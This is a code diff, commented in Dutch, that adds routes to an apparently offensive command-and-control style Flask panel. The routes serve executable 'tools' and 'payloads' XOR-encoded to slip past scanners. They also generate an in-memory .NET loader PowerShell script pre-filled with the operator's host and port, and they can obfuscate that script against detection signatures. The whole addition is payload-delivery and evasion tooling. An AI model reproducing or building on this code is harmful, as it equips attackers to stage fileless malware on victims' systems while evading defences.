@@ -1338,6 +1338,134 @@ def macro_download_compat(run_id):
 
 
 # ---------------------------------------------------------------------------
+# Invoke-Assembly — in-memory .NET loader
+# ---------------------------------------------------------------------------
+
+@macro_bp.route("/dashboard/invoke-assembly", methods=["GET"])
+def invoke_assembly_dashboard():
+    """Invoke-Assembly pagina."""
+    _ensure_access()
+    return render_template("invoke_assembly.html")
+
+
+def _xor_bytes(data: bytes, hex_key: str) -> bytes:
+    """XOR-codeer/decodeer bytes met een hex-sleutel."""
+    if not hex_key:
+        return data
+    key = bytes(int(hex_key[i:i+2], 16) for i in range(0, len(hex_key), 2))
+    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
+
+
+def _obfuscate_ps1_content(content: str) -> str:
+    """Obfusceer PS1 tekst via obfuscate_ps pipeline. Retourneert obfuscated string."""
+    try:
+        lines = content.splitlines(keepends=True)
+        signatures = build_signatures()
+        new_lines, stats, _ = obfuscate_file(lines, signatures, 'mixed')
+        if stats.get("lines_changed", 0) > 0:
+            return "".join(new_lines)
+    except Exception:
+        pass
+    return content
+
+
+@macro_bp.route("/api/invoke-assembly/xor/<source>/<filename>", methods=["GET"])
+def invoke_assembly_xor(source, filename):
+    """Serveer een .exe tool/payload XOR-gecodeerd met de opgegeven hex-sleutel."""
+    _ensure_access()
+    from flask import Response as _Resp
+
+    # Valideer source en bestandsnaam
+    if source not in ("tools", "payloads"):
+        abort(400)
+    safe = secure_filename(filename)
+    if not safe or not safe.lower().endswith(".exe"):
+        abort(400)
+
+    hex_key = request.args.get("key", "").strip().lower()
+    if not hex_key or not all(c in "0123456789abcdef" for c in hex_key) or len(hex_key) % 2:
+        abort(400)
+
+    file_path = Path.cwd() / "http" / source / safe
+    if not file_path.is_file():
+        abort(404)
+
+    raw   = file_path.read_bytes()
+    xored = _xor_bytes(raw, hex_key)
+    return _Resp(
+        xored,
+        mimetype="application/octet-stream",
+        headers={"Content-Disposition": f'attachment; filename="{safe}.xor"'},
+    )
+
+
+@macro_bp.route("/api/invoke-assembly/script", methods=["GET"])
+def invoke_assembly_script():
+    """Genereer invoke_assembly.ps1 met LHOST/port ingevuld, optioneel met tool/payload vooringesteld."""
+    _ensure_access()
+    from meuk.flask.models import db_instellingen
+    from flask import Response
+
+    s = db_instellingen.query.first()
+    lhost = (s.localhost or "").replace("https://", "").replace("http://", "").strip()
+
+    tool       = request.args.get("tool",       "").strip()
+    payload    = request.args.get("payload",    "").strip()
+    url_param  = request.args.get("url",        "").strip()
+    args       = request.args.get("args",       "").strip()
+    port       = request.args.get("port",       "80").strip()
+    entrypoint = request.args.get("entrypoint", "").strip()
+    xor_key    = request.args.get("xor",        "").strip().lower()
+    do_obf     = request.args.get("obfuscate",  "").strip() == "1"
+
+    # Valideer port
+    if not port.isdigit() or len(port) > 5:
+        port = "80"
+
+    # Valideer XOR key (alleen hex, even lengte, max 64 tekens)
+    if xor_key and (not all(c in "0123456789abcdef" for c in xor_key)
+                    or len(xor_key) % 2 or len(xor_key) > 64):
+        xor_key = ""
+
+    template_path = Path.cwd() / "meuk" / "template" / "invoke_assembly.ps1"
+    if not template_path.is_file():
+        abort(404)
+
+    content = template_path.read_text(encoding="utf-8")
+    content = (content
+               .replace("[ip]", lhost)
+               .replace("[port]", port)
+               .replace("[xor_key]", xor_key))
+
+    # Genereer kant-en-klare invocatie
+    arg_part  = f' -Arg {args}'              if args       else ""
+    ep_part   = f' -EntryPoint {entrypoint}' if entrypoint else ""
+    xor_part  = f' -XorKey {xor_key}'        if xor_key    else ""
+    invocation = ""
+    if url_param:
+        invocation = f'.\\invoke_assembly.ps1 -Url {url_param}{arg_part}{ep_part}{xor_part}'
+    elif tool:
+        invocation = f'.\\invoke_assembly.ps1 -Tool {tool}{arg_part}{ep_part}{xor_part}'
+    elif payload:
+        invocation = f'.\\invoke_assembly.ps1 -Payload {payload}{arg_part}{ep_part}{xor_part}'
+
+    if invocation:
+        content += f"\n# Gegenereerde aanroep:\n# {invocation}\n"
+
+    # Optionele PS1 obfuscatie via obfuscate_ps pipeline
+    if do_obf:
+        content = _obfuscate_ps1_content(content)
+
+    label    = tool or payload or (url_param.split("/")[-1] if url_param else "loader")
+    filename = f"invoke_assembly_{label}.ps1".replace(".exe", "")
+    return Response(
+        content,
+        mimetype="text/plain",
+        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
+    )
+
+
+# ---------------------------------------------------------------------------
 # Command Library — screen injectie
 # ---------------------------------------------------------------------------
 
